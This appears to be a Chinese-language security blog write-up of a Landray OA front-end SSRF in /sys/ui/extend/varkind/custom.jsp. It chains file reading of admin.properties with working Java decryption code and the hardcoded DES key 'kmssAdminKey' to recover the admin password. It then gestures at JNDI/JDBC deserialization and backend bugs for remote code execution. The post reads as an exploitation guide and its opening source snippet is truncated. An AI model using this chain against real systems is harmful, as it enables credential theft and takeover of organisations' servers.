蓝凌OA前台SSRF漏洞
漏洞地址: /sys/ui/extend/varkind/custom.jsp
直接贴源码:
'>
挺简单的⼀处漏洞。。
内容就是⼀堆套娃处理。不细说。
问题就是在于 标签提供了所有⾏为标签所具有的功能，同时也允许
包含绝对URL。
举例来说，使⽤标签可以包含⼀个FTP服务器中不同的⽹⻚内容。
url的内容可控为json内容中的file键值。
这⾥的url可以是相对路径和绝对路径或者是其他主机的资源。
简单来说就是⼀处ssrf。并且是有回显的。
看了⼤部分poc都是利⽤file协议去读取passwd。 
你以为⽂章到这就结束了？？？这才刚刚开始。
既然是SSRF，并且可以读⽂件还⽀持相对路径？。这不好好利⽤⼀下？
如果你看过蓝凌OA的配置⽂档。你就知道，admin.do这个路径是管理系统配置。并
且，该地址的密码是以硬编码的格式保存在本地的。
路径: WEB-INF/KmssConfig/admin.properties
既然上⾯的ssrf⽀持相对路径和绝对路径。并且，是有回显的。那么只需要读取这
个路径的⽂件就可以了。
成功得到密码，但是这⾥要注意 kmss.properties.encrypt.enabled = true
如果为ture，则说明password的内容是加密过的。
那么就需要进⼀步解密。
先看看这个⽂件在哪⾥被读取了。
在 com.landray.kmss.sys.config.constant.SysConfigConstant 类
中， admin.properties 的路径被存储在变量 ADMIN_PROPERTIES_PATH 中。
继续查找，看⼀下哪⾥调⽤了 ADMIN_PROPERTIES_PATH 变量
最终在 com.landray.kmss.sys.config.action.SysConfigAdminUtil 中发现
getAdminProperties ⽅法中存在调⽤。
看了下具体逻辑。
    if (isEncryptEnabled(p))
    if (isEncryptEnabled(p))
      p.setProperty("password", doPasswordDecrypt(
            p.getProperty("password"))); 
    return p;
  }
如果配置⽂件中的加密选项为true。则进⼊ doPasswordDecrypt ⽅法进⾏解密。 
这不就直接可以了吗？ 
解密代码:
import com.landray.kmss.util.DESEncrypt;
public class main {
    public static void main(String[] args) {
        String password = "mqwEyqHLj9PQXpy+yhf4z92SejWx+VeS";
        String resul=doPasswordDecrypt(password);
        System.out.println(resul);
    }
    public static String doPasswordDecrypt(String password) {
        try {
            DESEncrypt des = new DESEncrypt("kmssAdminKey");
            return des.decryptString(password);
        } catch (Exception ex) {
            try {
                DESEncrypt des0 = new DESEncrypt("kmssAdminKey", 
true);
                return des0.decryptString(password);
            } catch (Exception e) {
                return "hh";
            }
        }
    }
}
得到解密结果 
直接访问admin.do进⾏登陆。
到了这⼀步。。。估计其他师傅已经知道怎么rce了。jndi，jdbc反序列化就可以直
接rce了
不过，对于我这种懒狗来说。还是不够简洁。
对于admin账号。可以直接在前台登陆。 
然后利⽤hw期间爆出的后台洞就可以直接拿到shell。
这⾥摸⼀个0day，带⾛。